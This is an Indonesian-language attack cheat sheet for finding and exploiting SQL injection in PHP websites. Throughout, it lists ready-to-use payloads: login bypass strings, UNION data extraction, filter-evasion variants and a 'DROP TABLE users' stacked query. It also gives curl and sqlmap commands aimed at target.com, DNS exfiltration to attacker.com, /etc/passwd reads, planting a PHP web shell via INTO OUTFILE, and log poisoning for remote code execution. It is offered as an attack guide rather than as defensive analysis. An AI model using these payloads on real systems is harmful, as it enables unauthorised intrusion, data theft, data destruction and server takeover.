Cari bug sql
ctrl+u
cari bagian
<form action=
atau
file.php

 1. Cari: <form action=...>

Contoh:

<form action="login.php" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
</form>

Berarti request POST akan dikirim ke login.php dengan parameter username dan password
Uji SQLi di field username atau password dengan payload seperti:
' OR '1'='1

cari: URL ke .php file dengan parameter

<a href="product.php?id=5">View Product</a>
Itu artinya URL mengandung parameter GET id=5.
Bisa diuji SQLi dengan akses
product.php?id=5'    --> lihat error atau perubahan tampilan
product.php?id=5 AND 1=1
product.php?id=5 AND 1=2
Kalau halaman berubah antara 1=1 (benar) dan 1=2 (salah) ‚Äî bisa SQLi ‚úÖ

| Kata Kunci HTML     | Tujuan                                   |
| ------------------- | ---------------------------------------- |
| `action=`           | Menemukan file target POST               |
| `.php?`             | Cari parameter GET rentan SQLi           |
| `method="POST"`     | Tandanya form bisa diuji input injection |
| `input name=`       | Lihat nama parameter dikirim ke server   |
| `select`, `option`  | Kadang parameter berasal dari dropdown   |
| `search.php?query=` | Target yang sering rentan SQLi           |

| Contoh URL/HTML                            | Analisis                            |
| ------------------------------------------ | ----------------------------------- |
| `login.php`                                | Coba inject di username/password    |
| `search.php?query=abc`                     | SQLi di parameter `query`           |
| `<form action="submit.php" method="post">` | Coba inject di semua input form-nya |
| `<a href="view.php?id=10">`                | Coba ubah `id=10` jadi SQL payload  |


Payload Uji Cepat SQLi:
1' OR '1'='1
' OR 1=1 --
' AND 1=2 --
1' ORDER BY 5 --
1' UNION SELECT null, null --


SQL Injection teknik lanjutan dan alternatif, termasuk bypass modern, fungsi tersembunyi, dan kombinasi unik

üî• 1. Inline Subquery Injection
?id=1' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --
Mengetes apakah user tertentu ada tanpa melihat hasil query.

üî• 2. Stacked Queries (jika DB mengizinkan, misal PostgreSQL, MySQL jika multi_query aktif)
?id=1; DROP TABLE users; --
Contoh ekstrem ‚Äì kirim dua query dalam satu request.

üî• 3. Error-based Bypass (fungsi tersembunyi)

?id=1' AND updatexml(1,concat(0x7e,database()),1) --
Output:

XPATH syntax error: '~yourdbname'
Atau:
extractvalue(1,concat(0x7e,(SELECT user())))

üî• 4. Time-Based Bypass (Blind SQLi)
?id=1' AND IF(1=1,SLEEP(5),0) --
Kalau delay 5 detik ‚Üí server eval ekspresi ‚Üí ‚úÖ vulnerable.

| Target Diblok     | Bypass Alternatif                           |
| ----------------- | ------------------------------------------- |
| `UNION SELECT`    | `UNIunionON SEselectLECT` (dibagi karakter) |
| `SELECT`          | `SEL/**/ECT`, `S/*!00000ELECT*/`            |
| `' OR '1'='1`     | `'%20OR%20'1'%3D'1` (URL-encoded)           |
| `--`              | `#`, `%23`, `/*`                            |
| `SLEEP(5)` diblok | `benchmark(10000000,MD5(1))`                |

üî• 6. Second-order SQL Injection
Parameter terlihat aman saat disimpan, tapi dievaluasi di proses lain.

Contoh:

Form input email=' or 1=1 -- disimpan ke database.

Proses reset password baca field tersebut ‚Üí dievaluasi ‚Üí SQLi!

üî• 7. Boolean Obfuscation
Jika:
?id=1' AND 1=1 --
Diblokir, coba:
?id=1' && 1=1 #
?id=1' OR 1 LIKE 1 #
?id=1' OR ASCII(SUBSTRING(version(),1,1))=52 #

üî• 8. Using INFORMATION_SCHEMA untuk eksploitasi data schema
Cek semua tabel:
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
Cek semua kolom:
SELECT column_name FROM information_schema.columns WHERE table_name='users';

üî• 9. Bypass LIMIT dan OFFSET untuk enum data
' UNION SELECT username, password FROM users LIMIT 1 OFFSET 0 -- 
' UNION SELECT username, password FROM users LIMIT 1 OFFSET 1 -- 
Looping lewat data satu per satu (seperti blind enum manual).

üî• 10. Out-of-Band SQLi (DNS exfiltration)
Hanya jika target mengizinkan koneksi keluar:
LOAD_FILE('\\\\attacker.com\\x') 
Atau gunakan payload dari tools seperti sqlmap --dns-domain.

| Tempat                   | Contoh                            |
| ------------------------ | --------------------------------- |
| HTTP Header (User-Agent) | Header: `User-Agent: ' OR 1=1 --` |
| Cookie                   | `Cookie: session=xyz' OR 1=1 --`  |
| Referer                  | Referer: `' OR 1=1 --`            |
| JSON/POST                | `{"id": "1' OR 1=1 --"}`          |


üß† 1. SQL Injection via User-Agent Header

GET /profile.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0' OR 1=1 --

üìå Kalau User-Agent disimpan ke database (untuk statistik/log) tanpa filtering, bisa terjadi second-order SQLi.
‚ûï Tips:
Gunakan Burp Suite ‚Üí tab Intruder atau Repeater

Atau pakai curl:
curl -A "' OR 1=1 --" http://target.com/page.php

üç™ 2. SQL Injection via Cookie Header
GET /dashboard.php HTTP/1.1
Host: target.com
Cookie: session_id=123' OR '1'='1
üìå Banyak sistem menyimpan session token, ID pengguna, atau preferensi di cookie ‚Üí jika digunakan dalam query SQL, maka bisa disuntik.
‚ûï Curl:
curl -H "Cookie: id=1' OR 1=1 --" http://target.com/page.php

üåê 3. SQL Injection via Referer Header

GET /index.php HTTP/1.1
Host: target.com
Referer: http://evil.com/' OR '1'='1
üìå Jika Referer digunakan dalam query (misalnya: tracking asal pengunjung) tanpa sanitasi ‚Üí rentan.
‚ûï Curl:
curl -e "' OR 1=1 --" http://target.com/

üîß 4. SQL Injection via JSON / POST Body
Misal endpoint:

POST /api/login HTTP/1.1
Content-Type: application/json

{
  "username": "admin",
  "password": "' OR '1'='1"
}

Atau form biasa (x-www-form-urlencoded):

POST /login.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=' OR '1'='1

‚ûï Curl JSON:

curl -X POST http://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "'\'' OR '\''1'\''='\''1"}'

| Cara                      | Tools/Metode                     |
| ------------------------- | -------------------------------- |
| Intercept pakai BurpSuite | Ubah header saat request         |
| Pakai curl & modifikasi   | Header: `-H`, Cookie: `--cookie` |
| Lihat di source code HTML | Form `action`, JS `fetch()`      |
| Gunakan `sqlmap` otomatis | `--level=5 --risk=3`             |

üí£ SQLMAP untuk Tes Header
sqlmap -u http://target.com/page.php --headers="User-Agent: ' OR 1=1 --"
sqlmap -u http://target.com/ --cookie="id=1' OR 1=1 --"


____________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

coba tes inject manual atau sqlmap

Contoh Manual Boolean-Based:
?id=1' AND 1=1 --     ‚úÖ benar ‚Üí halaman normal
?id=1' AND 1=2 --     ‚ùå salah ‚Üí halaman error atau kosong
Kalau respons berubah, berarti rentan terhadap Boolean-based blind

Contoh Manual Error-Based:
?id=1' AND updatexml(1, concat(0x7e, (SELECT database())), 1) -- 
Kalau keluar error: XPATH syntax error: '~database_name' ‚Üí vuln ‚úÖ

Contoh Manual UNION-Based:
?id=1' ORDER BY 1 --
?id=1' ORDER BY 2 --
Setelah tahu jumlah kolom (misal 3), coba:
?id=-1' UNION SELECT 1,2,3 --

Contoh Manual Time-Based:
?id=1' AND SLEEP(5) -- 

Arti Singkatan --technique=BEUSTQ di sqlmap
| Huruf | Teknik SQLi                | Penjelasan Singkat                                                              |
| ----- | -------------------------- | ------------------------------------------------------------------------------- |
| **B** | Boolean-based blind        | Jawaban *benar/salah* tanpa melihat data langsung. Contoh: `AND 1=1`, `AND 1=2` |
| **E** | Error-based                | Memanfaatkan pesan error database untuk ekstraksi data                          |
| **U** | UNION query                | Menggabungkan hasil dengan `UNION SELECT` untuk ekstraksi data                  |
| **S** | Stacked queries            | Mengirim beberapa query dalam satu kali permintaan (`; SELECT ...`)             |
| **T** | Time-based blind           | Menggunakan delay (seperti `SLEEP(5)`) untuk deteksi kondisi benar/salah        |
| **Q** | Inline query (out-of-band) | SQLi via DNS atau HTTP out-of-band (jarang berhasil, tapi powerful jika jalan)  |

SQL + LFI Kombinasi (SQL2LFI)

?id=1 UNION SELECT 1, load_file('/etc/passwd'), 3 --
Kalau berhasil, isi /etc/passwd ditampilkan di kolom ke-2 halaman
?id=1 UNION ALL SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' --

LFI Basic
?page=../../../../etc/passwd

| Tujuan                    | Bypass                                                     |
| ------------------------- | ---------------------------------------------------------- |
| Bypass `.php`             | `?page=../../../../etc/passwd%00` (**PHP <5.3**)           |
| Encode `../`              | `..%2f..%2fetc%2fpasswd`<br>`....//....//etc/passwd`       |
| Bypass ekstensi `.php`    | `?page=php://filter/convert.base64-encode/resource=config` |
| Read dengan `php://input` | POST shell ke `php://input` dan include                    |

Contoh Kombinasi SQL + LFI di Server

Misal: ?id=1 SQLi ‚Üí Kita bisa
UNION SELECT "<?php system($_GET['x']); ?>" INTO OUTFILE '/var/www/html/x.php'
?page=../../uploads/x.php

LFI Exploit Tips
?page=php://filter/convert.base64-encode/resource=index
Hasilnya: base64 dari source code index.php.

Real Exploit LFI ‚Üí RCE
LFI bisa jadi RCE jika:
Kamu bisa menyisipkan kode di log (access log / error log)
Kamu tahu path log

# Kirim user-agent:
curl -A "<?php system($_GET['cmd']); ?>" http://target

# Akses:
?page=/var/log/apache2/access.log&cmd=id

Boom! Kamu eksekusi perintah via log file üß®

